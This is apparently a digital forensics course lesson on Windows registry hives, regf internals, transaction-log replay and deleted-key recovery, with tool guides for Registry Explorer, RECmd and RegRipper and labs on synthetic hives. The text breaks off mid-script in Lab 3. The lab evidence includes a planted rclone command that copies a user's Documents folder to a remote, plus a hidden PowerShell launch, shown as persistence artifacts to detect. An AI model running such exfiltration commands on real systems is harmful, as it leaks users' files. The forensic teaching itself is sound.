# Day 11: Windows Registry Fundamentals: Hives, Keys and Transaction Logs

> **Phase 2: Windows Forensics** · **Level:** 🟡 Intermediate · **Time:** ~3–4 hours (reading + labs) · **Posted:** 2026-10-08
>
> **Tools today:** 🛠️ Registry Explorer · 🛠️ RECmd · 🛠️ RegRipper

---

## 🎯 Learning objectives

By the end of today you will be able to:

1. Map the logical registry (`HKLM`, `HKCU`, `HKU`, `HKCR`) to the **hive files** on disk, and say which hive answers which question.
2. Read the **regf** format: base block, hbins, cells, key (`nk`) and value (`vk`) records, and the one timestamp the registry keeps per key.
3. Explain **transaction logs** (`.LOG1`/`.LOG2`): why collected hives are often **dirty**, how to tell, and how to replay the logs before analysis.
4. Recover **deleted keys and values** from free cells, and know when that stops working.
5. Pull system information, persistence and user activity out of hives with **RegRipper**, **RECmd** (including batch files) and **Registry Explorer**.

---

## Part 1: The lesson

The registry is Windows' configuration database: hardware, services, installed software, users, their settings and a lot of their activity. For an investigator it answers questions such as *what is this machine, who used it, what starts automatically, and what did the user type or run?* Everything you'll analyse over the next two weeks (execution evidence, shellbags, USB devices, persistence) lives in it.

### 1.1 Logical view vs. files on disk

`regedit` shows five root keys. Only some of them are real files:

| You see | It really is | File on disk |
|---|---|---|
| `HKLM\SYSTEM` | SYSTEM hive | `C:\Windows\System32\config\SYSTEM` |
| `HKLM\SOFTWARE` | SOFTWARE hive | `C:\Windows\System32\config\SOFTWARE` |
| `HKLM\SAM` | SAM hive (local accounts) | `C:\Windows\System32\config\SAM` |
| `HKLM\SECURITY` | SECURITY hive (policy, LSA secrets) | `C:\Windows\System32\config\SECURITY` |
| `HKU\.DEFAULT` | DEFAULT hive (the SYSTEM account's profile, not a template) | `C:\Windows\System32\config\DEFAULT` |
| `HKU\<SID>` = `HKCU` | The user's NTUSER.DAT | `C:\Users\<user>\NTUSER.DAT` |
| `HKU\<SID>_Classes` | The user's UsrClass.dat (ShellBags, Day 13) | `C:\Users\<user>\AppData\Local\Microsoft\Windows\UsrClass.dat` |
| `HKCR` | A **merged view** of `HKLM\SOFTWARE\Classes` and the user's Classes | (no file of its own) |
| `HKLM\HARDWARE`, `HKCC` | Built in memory at boot / a link into SYSTEM | none |
| (not mounted) | Amcache (Day 12), BCD, COMPONENTS, DRIVERS | `C:\Windows\AppCompat\Programs\Amcache.hve`, `\Boot\BCD` on the EFI partition, ... |

Three things to remember:

- **`CurrentControlSet` doesn't exist in the file.** The SYSTEM hive has `ControlSet001` (sometimes `ControlSet002`), and `SYSTEM\Select\Current` says which one was in use. Always check `Select` before reading anything under a control set.
- **Each hive file has transaction logs next to it** (`SYSTEM.LOG1`, `SYSTEM.LOG2`, `NTUSER.DAT.LOG1`…). Collect them together (Day 9).
- **`RegBack` backups:** since Windows 10 version 1803, the automatic copies in `C:\Windows\System32\config\RegBack` are no longer made by default. The folder may exist but be empty. Volume Shadow Copies (Day 20) are the usual source of older hives.

### 1.2 Inside a hive: the regf format

```
0x0000  base block (4 KB)  "regf", sequence numbers, last-written time, root cell, size, name, checksum
0x1000  hbin #0 (4 KB+)    "hbin" header, then cells
0x2000  hbin #1 ...        cell = 4-byte size + data; size < 0 = in use, size > 0 = FREE
```

**Base block fields that matter:**

| Offset | Field | Why you care |
|---|---|---|
| 0x00 | `regf` | Signature |
| 0x04 / 0x08 | **Primary / secondary sequence numbers** | Equal = clean; **different = dirty** (§1.4) |
| 0x0C | Last written (FILETIME) | When the hive file itself was last updated |
| 0x1C | File type | 0 = hive, 1/2 = old-format log, 6 = new-format log (Windows 8.1+) |
| 0x24 | Root cell offset | Offsets are relative to the first hbin (file offset 0x1000) |
| 0x28 | Hive bins data size | |
| 0x30 | File name | The **last 31 characters** of the path the hive was loaded from, e.g. `\??\C:\Users\alice\ntuser.dat` |
| 0x1FC | Checksum | XOR of the first 508 bytes |

**Cells** carry everything else:

| Cell | Signature | Holds |
|---|---|---|
| Key node | `nk` | Name, flags, **last-write time**, parent, subkey count and list, value count and list, security cell, class name |
| Value | `vk` | Name, type, size, and the data (or a pointer to it; data of 4 bytes or less is stored in the `vk` itself) |
| Security | `sk` | A security descriptor shared by many keys |
| Subkey index | `lf`, `lh`, `li`, `ri` | Lists of child keys (`lh` stores a hash of each name) |
| Big data | `db` | Values larger than about 16 KB, split into segments |
| Value list / data | (none) | Arrays of `vk` offsets; raw value data |

**Value types** you'll meet: `REG_SZ` (UTF-16 string), `REG_EXPAND_SZ` (string with `%variables%`), `REG_MULTI_SZ` (list of strings), `REG_DWORD` (32-bit; `TimeZoneInformation\Bias` is a *signed* one, so `0xffffffc4` means −60), `REG_QWORD` (64-bit), `REG_BINARY` (anything: FILETIMEs, MRU lists, ROT13-encoded UserAssist data…).

### 1.3 Time in the registry

- **Only keys have timestamps.** Each `nk` has one **last-write time**, updated when a value or subkey of that key is created, changed or deleted. Values have no time of their own, so a key's time tells you that *something* in it changed, not what.
- **A parent key's time also changes** when a child key is created or deleted. That's how you date a deletion: `Services` was written at 01:22:10 in today's lab.
- **Some values hold their own times:** `ShutdownTime` (FILETIME), `InstallDate` (Unix seconds), `InstallTime` (FILETIME), UserAssist and many others (Days 12–13). Each has its own format, so decode carefully.
- **Anti-forensics:** key times can be set with `NtSetInformationKey` (tools such as SetRegTime). Look for keys whose times don't fit their siblings, their parent or the rest of the timeline.

### 1.4 Transaction logs and dirty hives

Windows doesn't write every change straight into the hive file. It writes the changed pages to a **transaction log** first, and flushes them into the hive later. In Windows 8.1 and later the flush can lag well behind (often a long time on a running system). The base block's sequence numbers track this: Windows increments the **primary** number before writing to the hive and sets the **secondary** to match when the write completes.

- **Primary = secondary:** the hive is consistent (clean).
- **Primary ≠ secondary:** the hive is **dirty**. Recent changes are in `.LOG1`/`.LOG2`, not in the file you're about to analyse.

New-format logs (Windows 8.1+) are a series of **log entries** (`HvLE`), each with a sequence number and a set of dirty pages. Replaying the log means applying, in order, the entries newer than the hive's last complete write. Old-format logs (Vista/7) store a dirty-page bitmap instead.

**What this means for you:**

| Tool | Dirty hive behaviour |
|---|---|
| **rla** (Eric Zimmerman) | Replays the logs and writes a clean copy |
| **RECmd**, **Registry Explorer** | Replay automatically when the logs are next to the hive. RECmd refuses a dirty hive with no logs unless you pass `--nl` |
| **RegRipper** | Does **not** replay logs; `rip -d` tells you the hive is dirty. Replay with rla (or yarp) first |

A triage collection taken from a running system is very often dirty, and the most recent activity, which is usually what you want, may be only in the logs. In Lab 5 a dirty hive shows two keys that had already been **deleted**, and hides a third key that had been **created**.

### 1.5 Deleted keys and values

When a key or value is deleted, Windows marks its cells **free** (positive size) and unlinks them from the parent's lists. The bytes stay until the space is reused. Recovery tools look for `nk`/`vk` structures in free cells and, where possible, reattach them to their parent:

- **RECmd / Registry Explorer** recover deleted keys and values by default and mark them `Deleted: True`.
- **RegRipper's `del` plugin** prints deleted keys and values with a hex dump.
- **Unassociated** deleted values (whose key can't be identified) still show their name and data.

Recovery gets harder over time. Newer Windows versions occasionally **reorganise** hives, rewriting them compactly and discarding free cells. Values can also be hidden in **slack** (unused bytes at the end of an allocated cell; RECmd shows them as `Slack:`).

### 1.6 A first map of forensic keys

Detailed artifacts get their own days; these are the orientation keys you check on every case:

| Question | Hive | Key / value | Notes |
|---|---|---|---|
| Which control set? | SYSTEM | `Select\Current` | Read this first |
| Computer name | SYSTEM | `ControlSet00N\Control\ComputerName\ComputerName` | |
| Time zone | SYSTEM | `…\Control\TimeZoneInformation` | `Bias`/`ActiveTimeBias` are signed minutes (UTC = local + bias) |
| Last clean shutdown | SYSTEM | `…\Control\Windows\ShutdownTime` | FILETIME in a `REG_BINARY` |
| Windows version | SOFTWARE | `Microsoft\Windows NT\CurrentVersion` | **Windows 11 still says "Windows 10" in `ProductName`**: use `CurrentBuild` (22000 or higher = Windows 11) and `DisplayVersion` |
| Install date | SOFTWARE | same key, `InstallDate` / `InstallTime` | Reset by feature upgrades |
| Users | SOFTWARE | `…\CurrentVersion\ProfileList\<SID>` | SID → profile folder |
| Services (persistence, lateral movement) | SYSTEM | `…\Services\<name>` | `ImagePath`, `Start` (2 = automatic), key time |
| Run keys | SOFTWARE, NTUSER | `Microsoft\Windows\CurrentVersion\Run` (+ `RunOnce`) | Day 22 covers the many others |
| Typed in Win+R | NTUSER | `…\Explorer\RunMRU` | `MRUList` gives the order |
| Typed in Explorer's address bar | NTUSER | `…\Explorer\TypedPaths` | `url1` = most recent |

---

## Part 2: Tools

---

### 🛠️ Tool 1: Registry Explorer

| | |
|---|---|
| **What** | Eric Zimmerman's GUI registry viewer for offline hives (and the live system) |
| **Why in DFIR** | Shows keys and values with technical details (cell offsets, slack), **recovers deleted keys and values**, **replays transaction logs** for dirty hives, has bookmarks for common forensic keys and plugins that decode binary values |
| **Platforms** | Windows (needs the .NET 9 Desktop Runtime) |
| **Licence** | Free (closed source); its parsing library, `Registry`, is open source (MIT) |
| **Home** | https://ericzimmerman.github.io · library: https://github.com/EricZimmerman/Registry |

> ⚠️ **Not run here.** Registry Explorer is a Windows GUI program, so this section wasn't run in the Linux lab. RECmd (Tool 2) uses the same parsing library, so its results in the labs are what Registry Explorer shows you.

#### Requirements

Windows 10/11 analysis VM with the **.NET 9 Desktop Runtime** (Day 1).

#### Installation

```powershell
# All EZ tools, as on Day 1; Registry Explorer lands in its own folder
C:\Tools\ZimmermanTools\Get-ZimmermanTools.ps1 -Dest C:\Tools\ZimmermanTools -NetVersion 9
Get-ChildItem C:\Tools\ZimmermanTools\net9\RegistryExplorer\RegistryExplorer.exe
```

Or download Registry Explorer on its own from https://ericzimmerman.github.io and extract it.

#### Configuration

- **Options:** set the date/time format to include 7-digit fractions, and keep times in **UTC**.
- **Bookmarks:** the bookmark list jumps to well-known forensic keys. Add your own for keys you check on every case.
- **Plugins:** decoded views for binary values (UserAssist, MRU lists, …) ship with the program and update with it.
- **Transaction logs:** keep `.LOG1`/`.LOG2` in the same folder as the hive. When you open a dirty hive, Registry Explorer offers to replay the logs and save a clean copy. Accept, and analyse the clean copy.

#### Verify the installation

Start `RegistryExplorer.exe`, open a hive from the lab (copy `~/cases/LAB-011/evidence/WS-ALICE/SYSTEM` to the VM), and browse to `ControlSet001\Control\ComputerName\ComputerName`. It should show `WS-ALICE`.

#### First use

1. *File → Load hive*: load SYSTEM, SOFTWARE and NTUSER.DAT together (each with its logs).
2. Expand the **deleted records** nodes Registry Explorer adds to each hive: the lab's deleted `PSEXESVC` service key appears there.
3. Use *Find* to search keys, values and data across all loaded hives, e.g. `rclone`.
4. Select a value and look at the technical details: cell offset, data size and slack.

#### Troubleshooting

| Symptom | Fix |
|---|---|
| Won't start | Install the **.NET 9 Desktop Runtime** (not only the base runtime) |
| "Hive is dirty" prompt, and you have no logs | You can load it without replaying, but say in your notes that recent changes may be missing; go back for the `.LOG1`/`.LOG2` files |
| A key you expect isn't there | Check `Select\Current` (wrong control set?), the deleted records nodes, and whether the logs were replayed |
| Times don't match other tools | Set Registry Explorer's display time zone to UTC |

---

### 🛠️ Tool 2: RECmd (and rla)

| | |
|---|---|
| **What** | The command-line version of Registry Explorer's engine: search hives, dump keys, and run **batch files** (`.reb`) that pull dozens of forensic keys into one CSV. **rla** (Registry Log Applier), from the same repository, replays transaction logs into clean hive copies |
| **Why in DFIR** | Scriptable, fast across many hives (`-d` folder), CSV output for Timeline Explorer, deleted-data recovery and automatic log replay |
| **Platforms** | Windows (.NET 9 and .NET Framework 4.6.2 builds). In this lesson both tools were **built from source and run on Ubuntu 24.04** |
| **Licence** | MIT |
| **Home** | https://github.com/EricZimmerman/RECmd |

#### Requirements

Windows with the .NET 9 runtime, or Linux with a .NET SDK to build (Ubuntu 24.04: `dotnet-sdk-10.0`) and Git.

#### Installation

```powershell
# Windows: RECmd (with its BatchExamples and Plugins folders) comes with Get-ZimmermanTools;
# rla.exe ships alongside RECmd / Registry Explorer: find where your copy landed
C:\Tools\ZimmermanTools\net9\RECmd\RECmd.exe --version
$rla = (Get-ChildItem C:\Tools\ZimmermanTools -Recurse -Filter rla.exe | Select-Object -First 1).FullName
& $rla --version
```

```bash
# Linux (validated here): build both from source; the .NET 9 build runs on .NET 10 with roll-forward
sudo apt install -y dotnet-sdk-10.0 git
git clone -q --depth 1 https://github.com/EricZimmerman/RECmd.git ~/tools/RECmd-src
for p in RECmd rla; do
  dotnet publish ~/tools/RECmd-src/$p/$p.csproj -c Release -f net9.0 -o ~/tools/$p -v quiet > /dev/null
done
cat >> ~/.bashrc <<'EOF'
recmd() { DOTNET_ROLL_FORWARD=Major ~/tools/RECmd/RECmd "$@"; }
rla() { DOTNET_ROLL_FORWARD=Major ~/tools/rla/rla "$@"; }
EOF
```

The Linux build has no **plugins** (they come from a separate repository and are installed by `Get-ZimmermanTools` on Windows). Batch entries that rely on a plugin, for example decoded service details, then return only the key.

#### Configuration

All options from `RECmd --help` (version 2026.5.0):

| Option | Meaning |
|---|---|
| `-f HIVE` / `-d DIR` | One hive / every hive under a folder (recursively) |
| `--kn KEY` / `--vn VALUE` | Show a key (subkeys and values) / only this value |
| `--sa TEXT` | Search keys, values, data and slack. `--sk`, `--sv`, `--sd`, `--ss` search only one of them; `--regex`, `--literal` |
| `--bn FILE.reb` | **Batch mode**: run a batch file of key/value definitions |
| `--csv DIR --csvf NAME` / `--json` | Output |
| `--base64 N`, `--minSize N` | Find base64 values / values of at least N bytes (payloads hidden in the registry) |
| `--recover` | Recover deleted keys/values (default: true) |
| `--nl` | Allow a dirty hive without logs (otherwise RECmd aborts) |
| `--vss`, `--dedupe` | Live system: include shadow copies; de-duplicate by SHA-1 |
| `--sync` | Download the latest batch files |
| `--dt FORMAT` | Timestamp format |

**Batch files** live in `BatchExamples`: `Kroll_Batch.reb` (a broad DFIR set, documented in `Kroll_Batch.md`), `DFIRBatch.reb`, and focused ones such as `RegistryASEPs.reb` or `UserActivity.reb`. A batch entry names the hive type, key path, optional value, category, whether to recurse, and a comment. `!RECmdBatch.guide` explains how to write your own.

**rla** options: `-f HIVE` or `-d DIR`, `--out DIR` (only replayed hives are written there unless you add `--ca`), `--nop` (don't recreate folders).

#### Verify the installation

```bash
recmd --version     # 2026.5.0+<commit>
rla --version
```

#### First use

```powershell
# Windows: the whole KAPE output folder (Day 9) through the Kroll batch file
C:\Tools\ZimmermanTools\net9\RECmd\RECmd.exe -d E:\Cases\WS-ALICE\tout --bn C:\Tools\ZimmermanTools\net9\RECmd\BatchExamples\Kroll_Batch.reb --csv E:\Cases\WS-ALICE\registry
# Replay logs into clean copies first if you want to keep the originals untouched
& $rla -d E:\Cases\WS-ALICE\tout --out E:\Cases\WS-ALICE\hives-clean
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| `Registry hive is dirty and no transaction logs were found ... Aborting!!` | Copy the `.LOG1`/`.LOG2` files next to the hive with the same base name, or use `--nl` and note that recent changes may be missing |
| A batch entry returns only the key, no decoded data | That entry uses a plugin; install the `Plugins` folder (Windows `Get-ZimmermanTools`) |
| Key paths start with `ROOT\` in CSV but not with `--kn` | The CSV includes the hive's root key name; `--kn` paths start below it |
| `You must install or update .NET` | Install the .NET 9 runtime, or set `DOTNET_ROLL_FORWARD=Major` on a newer runtime |
| Outdated batch files | `RECmd --sync` |

---

### 🛠️ Tool 3: RegRipper

| | |
|---|---|
| **What** | Harlan Carvey's plugin-based registry parser: hundreds of Perl plugins, each extracting and explaining one artifact. `rip` is the command line; `rr` is the GUI |
| **Why in DFIR** | Fast, focused answers ("what's in the Run key?", "what's the time zone?") with the analyst's notes built into each plugin. Runs on Windows (`rip.exe`) and Linux (Perl) |
| **Platforms** | Windows; Linux and macOS with Perl and `Parse::Win32Registry` |
| **Licence** | RegRipper 3.0: **MIT**. (RegRipper 4.0 also exists, but its licence allows personal and academic use only and forbids redistribution and use in vendor training, so this course uses 3.0) |
| **Home** | https://github.com/keydet89/RegRipper3.0 |

> **No log replay:** the README says RegRipper does **not** process transaction logs. Run `rip -d` on every hive and replay dirty ones with rla first.

#### Requirements

- **Windows:** nothing; `rip.exe` and `rr.exe` are in the repository.
- **Linux/macOS:** Perl, the `Parse::Win32Registry` module, and the three **modified module files** shipped in the repository (`Base.pm`, `File.pm`, `Key.pm`).

#### Installation

```powershell
# Windows
git clone --depth 1 https://github.com/keydet89/RegRipper3.0.git C:\Tools\RegRipper3.0
C:\Tools\RegRipper3.0\rip.exe -h
```

```bash
# Linux (validated here): put the modified modules in a private lib folder that overrides the system ones
sudo apt install -y libparse-win32registry-perl git
git clone -q --depth 1 https://github.com/keydet89/RegRipper3.0.git ~/tools/RegRipper3.0
mkdir -p ~/tools/RegRipper3.0/lib/Parse/Win32Registry/WinNT
cp ~/tools/RegRipper3.0/{Base,File,Key}.pm ~/tools/RegRipper3.0/lib/Parse/Win32Registry/WinNT/
echo 'rip() { PERL5LIB=~/tools/RegRipper3.0/lib perl ~/tools/RegRipper3.0/rip.pl "$@"; }' >> ~/.bashrc
```

The README's own instruction is to copy the modified files over the installed module; `PERL5LIB` gets the same effect without changing system files. (SIFT and Ubuntu also package an older RegRipper 3.0 snapshot as `regripper`; the GitHub version has newer plugins.)

#### Configuration

From `rip -h`:

| Option | Meaning |
|---|---|
| `-r HIVE` | The hive to parse |
| `-p PLUGIN` | Run one plugin |
| `-a` / `-aT` | Run **all** plugins for this hive type / all TLN (timeline) plugins |
| `-f PROFILE` | Run a profile (a list of plugins) |
| `-d` | **Is the hive dirty?** |
| `-g` | Guess the hive type |
| `-l -c` | List plugins as CSV (name, version, hive, description) |
| `-s NAME`, `-u USER` | System / user name for TLN output |

Plugins are `.pl` files in `plugins/`; reading one is the best way to learn what a key means. All output goes to STDOUT: redirect it to a file in your case folder.

#### Verify the installation

```bash
rip -l -c | head -n 3      # Plugin,Version,Hive,Description ...
rip -l -c | tail -n +2 | wc -l
```

#### First use

```bash
rip -r SYSTEM -d                         # dirty?
rip -r SYSTEM -a > system_rr.txt         # everything RegRipper knows about a SYSTEM hive
rip -r NTUSER.DAT -p run                 # one question, one answer
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| `Can't locate Parse/Win32Registry.pm` | `sudo apt install libparse-win32registry-perl` (or install it from CPAN) |
| Odd errors or missing data on Linux | The modified `Base.pm`, `File.pm`, `Key.pm` aren't being used: check `PERL5LIB` |
| Results miss recent activity | The hive is dirty: `rip -d`, then replay with rla and rerun |
| In `del` output, a deleted value's "Data Length / Offset / Type" look wrong | A bug in `plugins/del.pl` (line 111 passes its three values in the wrong order): "Data Offset" shows the **length** and "Data Type" shows the **offset**. Read the hex dump below it |
| A plugin prints "not found" | The key doesn't exist in this hive (wrong hive type, or not used on this Windows version) |

---

## Part 3: Hands-on labs

You'll analyse hives from **WS-ALICE**, the workstation from Days 9 and 10, generated by `scripts/mk_reg_hives.py` (byte-identical on every run, with realistic key times, and with one deleted key and one deleted value). Then you'll replay a **real dirty hive** from Windows 10 with its transaction logs, from the yarp project's public test data.

Run on Ubuntu 24.04 or SIFT.

```bash
sudo apt update && sudo apt install -y libparse-win32registry-perl git curl dotnet-sdk-10.0
git -C ~/DFIR pull 2>/dev/null || git clone https://github.com/Mr-Phoenix07/DFIR.git ~/DFIR
mkdir -p ~/cases/LAB-011/{evidence,work,notes,samples} ~/tools && cd ~/cases/LAB-011
export TZ=UTC
```

Install RegRipper 3.0 and build RECmd and rla (about two minutes):

```bash
git clone -q --depth 1 https://github.com/keydet89/RegRipper3.0.git ~/tools/RegRipper3.0
git -C ~/tools/RegRipper3.0 log -1 --format='RegRipper3.0 %h %cs'
mkdir -p ~/tools/RegRipper3.0/lib/Parse/Win32Registry/WinNT
cp ~/tools/RegRipper3.0/{Base,File,Key}.pm ~/tools/RegRipper3.0/lib/Parse/Win32Registry/WinNT/
rip() { PERL5LIB=~/tools/RegRipper3.0/lib perl ~/tools/RegRipper3.0/rip.pl "$@"; }
rip -l -c | tail -n +2 | wc -l
git clone -q --depth 1 https://github.com/EricZimmerman/RECmd.git ~/tools/RECmd-src
git -C ~/tools/RECmd-src log -1 --format='RECmd source %h %cs'
for p in RECmd rla; do
  DOTNET_CLI_TELEMETRY_OPTOUT=1 DOTNET_NOLOGO=1 dotnet publish ~/tools/RECmd-src/$p/$p.csproj -c Release -f net9.0 -o ~/tools/$p -v quiet > /dev/null
done
recmd() { DOTNET_ROLL_FORWARD=Major ~/tools/RECmd/RECmd "$@"; }
rla() { DOTNET_ROLL_FORWARD=Major ~/tools/rla/rla "$@"; }
recmd --version
rla --version
```

```
RegRipper3.0 ec96dd4 2026-05-27
258
RECmd source bcd0ac3 2026-05-04
2026.5.0+bcd0ac33ed98de61ea6de551eef96052bddbbd49
2026.5.0+bcd0ac33ed98de61ea6de551eef96052bddbbd49
```

(Newer commits are fine; record the versions in your notes.)

### Lab 1: Meet the hive files (15 min)

```bash
cd ~/cases/LAB-011
python3 ~/DFIR/scripts/mk_reg_hives.py evidence/WS-ALICE
sha256sum evidence/WS-ALICE/* | tee notes/hives.sha256
xxd -l 64 evidence/WS-ALICE/SYSTEM
python3 ~/DFIR/scripts/regf_peek.py evidence/WS-ALICE/SYSTEM
rip -r evidence/WS-ALICE/NTUSER.DAT -g
rip -r evidence/WS-ALICE/SYSTEM -d
```

```
   8192  SYSTEM
   8192  SOFTWARE
   8192  NTUSER.DAT
bbeafe368c7d3ec39b85eab9d82d458b6d83ca4fd9ff2e5a23bf2c1952695bf4  evidence/WS-ALICE/NTUSER.DAT
900593bcbe53833849dd7e533586bbb7e7f17b06b2b05af599b2011d8e8c023a  evidence/WS-ALICE/SOFTWARE
82fc6ae2626d1657ef2b09d39b9d871f7042e34741eedaee43393c7ef269e85e  evidence/WS-ALICE/SYSTEM
00000000: 7265 6766 0100 0000 0100 0000 b13c 4af3  regf.........<J.
00000010: b04f dd01 0100 0000 0500 0000 0000 0000  .O..............
00000020: 0100 0000 9800 0000 0010 0000 0100 0000  ................
00000030: 7300 7400 6500 6d00 5200 6f00 6f00 7400  s.t.e.m.R.o.o.t.
File            : evidence/WS-ALICE/SYSTEM (8192 bytes)
Type            : primary hive, format 1, version 1.5
Sequence numbers: primary 1, secondary 1 -> CLEAN (equal)
Last written    : 2026-09-29 01:22:10.5550001 UTC
Root key cell   : 0x98    hive bins data size: 4096 bytes
Embedded name   : stemRoot\System32\Config\SYSTEM
Checksum        : stored 0x94f30692, calculated 0x94f30692 -> OK
hbins           : 1 found with an 'hbin' signature at 4 KB boundaries
Cells           : data/list FREE: 5, data/list used: 18, lh used: 5, nk FREE: 1, nk used: 11, vk FREE: 6, vk used: 23
ntuser
***Hive Check***
Hive is not dirty.
```

Match the hex to §1.2: `regf`; `0100 0000` twice = primary and secondary sequence 1 (clean); a FILETIME; version `1.5`; root cell `0x98`; `0x1000` bytes of hbins; and the start of the embedded name, the **last 31 characters** of `\SystemRoot\System32\Config\SYSTEM`. Real hives are megabytes, not 8 KB, but the structure is identical. Note the **free** cells: one `nk` and six `vk`. Lab 4 comes back to them.

### Lab 2: Keys, values and the one timestamp (20 min)

```bash
python3 ~/DFIR/scripts/regf_peek.py evidence/WS-ALICE/SYSTEM --tree | sed -n '/ROOT$/,$p' | grep -v -E '^ +(Type|ErrorControl|ObjectName|DisplayName) '
```

```
2026-09-29 01:22:10.5550001  ROOT
2026-03-02 09:00:00.1234567  ROOT\ControlSet001
2026-09-28 18:02:44.6620193  ROOT\ControlSet001\Control
2026-03-02 09:00:00.1234567  ROOT\ControlSet001\Control\ComputerName
2026-03-02 09:00:00.1234567  ROOT\ControlSet001\Control\ComputerName\ComputerName
                               ComputerName [REG_SZ] = WS-ALICE
2026-03-02 09:00:00.1234567  ROOT\ControlSet001\Control\TimeZoneInformation
                               Bias [REG_DWORD] = 4294967236 (0xffffffc4)
                               ActiveTimeBias [REG_DWORD] = 4294967176 (0xffffff88)
                               StandardName [REG_SZ] = @tzres.dll,-321
                               DaylightName [REG_SZ] = @tzres.dll,-322
                               TimeZoneKeyName [REG_SZ] = W. Europe Standard Time
2026-09-28 18:02:44.6620193  ROOT\ControlSet001\Control\Windows
                               ShutdownTime [REG_BINARY] = 21 3e fe 8f 73 4f dd 01
2026-09-29 01:22:10.5550001  ROOT\ControlSet001\Services
2026-09-29 01:22:10.5550001  ROOT\ControlSet001\Services\OneDriveSync
                               Start [REG_DWORD] = 2 (0x2)
                               ImagePath [REG_EXPAND_SZ] = C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop
2026-03-02 09:00:00.1234567  ROOT\ControlSet001\Services\W32Time
                               Start [REG_DWORD] = 3 (0x3)
                               ImagePath [REG_EXPAND_SZ] = %SystemRoot%\system32\svchost.exe -k LocalService
2026-03-02 09:00:00.1234567  ROOT\Select
                               Current [REG_DWORD] = 1 (0x1)
                               Default [REG_DWORD] = 1 (0x1)
                               Failed [REG_DWORD] = 0 (0x0)
                               LastKnownGood [REG_DWORD] = 1 (0x1)
```

This is the raw view a parser works from. Note:

- `Select\Current = 1`, so `ControlSet001` is the **CurrentControlSet**.
- Values have no times; keys do. `Services` changed at 01:22:10, when `OneDriveSync` was created. `Control` changed at 18:02:44, when `Windows\ShutdownTime` was written at shutdown.
- `Bias` is a signed DWORD: `0xffffffc4` is −60 minutes. `ShutdownTime` is a FILETIME stored as 8 little-endian bytes.

Now let RegRipper do the decoding:

```bash
for p in compname timezone shutdown; do rip -r evidence/WS-ALICE/SYSTEM -p $p | tail -n +4; done
for p in winver profilelist; do rip -r evidence/WS-ALICE/SOFTWARE -p $p | tail -n +4; done
```

```
ComputerName    = WS-ALICE
Launching timezone v.20200518
TimeZoneInformation key
ControlSet001\Control\TimeZoneInformation
LastWrite Time 2026-03-02 09:00:00Z
  DaylightName   -> @tzres.dll,-322
  StandardName   -> @tzres.dll,-321
  Bias           -> -60 (-1 hours)
  ActiveTimeBias -> -120 (-2 hours)
  TimeZoneKeyName-> W. Europe Standard Time
Launching shutdown v.20200518
ControlSet001\Control\Windows key, ShutdownTime value
LastWrite time: 2026-09-28 18:02:44Z
ShutdownTime  : 2026-09-28 18:02:44Z
Launching winver v.20200525
ProductName               Windows 10 Pro      
RegisteredOwner           alice               
InstallDate               2026-03-02 09:00:00Z
InstallTime               2026-03-02 09:00:00Z
Launching profilelist v.20200518
Microsoft\Windows NT\CurrentVersion\ProfileList

Path      : C:\Users\alice
SID       : S-1-5-21-3623811015-3361044348-30300820-1001
LastWrite : 2026-03-02 09:00:00Z

Path      : C:\Users\bob
SID       : S-1-5-21-3623811015-3361044348-30300820-1002
LastWrite : 2026-03-04 14:30:02Z

Microsoft\Windows NT\CurrentVersion\Winlogon not found.
```

Write these into your case notes as the **system profile**: WS-ALICE, UTC+1 with daylight saving (UTC+2 at the end of September), last clean shutdown 2026-09-28 18:02:44 UTC, installed 2026-03-02, two users. Note "**Windows 10 Pro**": this machine's `CurrentBuild` is 26100 (`regf_peek.py evidence/WS-ALICE/SOFTWARE --tree` shows it), so it's actually **Windows 11 24H2**. RegRipper's `winver` doesn't print the build; RECmd's batch output (Lab 3) does.

### Lab 3: Persistence and user activity (20 min)

```bash
rip -r evidence/WS-ALICE/SYSTEM -p services | tail -n +5
for p in run runmru typedpaths; do rip -r evidence/WS-ALICE/NTUSER.DAT -p $p | tail -n +3 | grep -v -e 'not found' -e '^$'; done
```

```
Tue Sep 29 01:22:10 2026 Z
  Name      = OneDriveSync
  Display   = OneDrive Sync Helper
  ImagePath = C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop
  Type      = Own_Process
  Start     = Auto Start
  Group     = 

Mon Mar  2 09:00:00 2026 Z
  Name      = W32Time
  Display   = Windows Time
  ImagePath = %SystemRoot%\system32\svchost.exe -k LocalService
  Type      = Own_Process
  Start     = Manual
  Group     = 

Launching run v.20200511
Software\Microsoft\Windows\CurrentVersion\Run
LastWrite Time 2026-09-29 01:21:30Z
  OneDriveUpdate - C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop
  OneDrive - "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background
Software\Microsoft\Windows\CurrentVersion\Run has no subkeys.
Launching runmru v.20200525
RunMru
Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
LastWrite Time 2026-09-29 01:09:31Z
MRUList = a
a   powershell -w hidden -nop\1
Launching typedpaths v.20200526
Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
LastWrite Time 2026-09-29 01:04:55Z
url1     \\203.0.113.50\drop           
url2     C:\Users\alice\AppData\Local\Temp\rc
```

(RegRipper's `run` plugin keeps values in a Perl hash, so `OneDrive` and `OneDriveUpdate` may swap places between runs.) The story from three hives, in time order: at 01:04:55 alice (or someone at her keyboard) typed a **network share** and the **Temp\rc** folder into Explorer; at 01:09:31 a hidden **PowerShell** was launched from Win+R; at 01:21:30 a user **Run** value was added to start rclone at every logon; at 01:22:10 an **auto-start service** was created doing the same as SYSTEM. Two persistence mechanisms, same payload: that's typical.

RECmd does the same job across all hives at once. A text search first (RECmd processes the hives in no fixed order, so the hits are sorted), then the Kroll batch file:

```bash
recmd -d evidence/WS-ALICE --sa rclone > work/recmd-search.txt
grep -E 'Key:' work/recmd-search.txt | sort
grep -E '^Found [0-9]+ hits' work/recmd-search.txt
recmd -d evidence/WS-ALICE --bn ~/tools/RECmd-src/BatchExamples/Kroll_Batch.reb --csv work/recmd --csvf kroll.csv | grep -E '^Found [0-9]'
python3 - work/recmd/kroll.csv <<'EOF'
import csv, sys
rows = [r for r in csv.DictReader(open(sys.argv[1], encoding="utf-8-sig"))
        if r["Category"] in ("Autoruns", "Program Execution", "User Activity")]
for r in sorted(rows, key=lambda r: (r["LastWriteTimestamp"], r["HiveType"], r["Description"], r["ValueName"])):
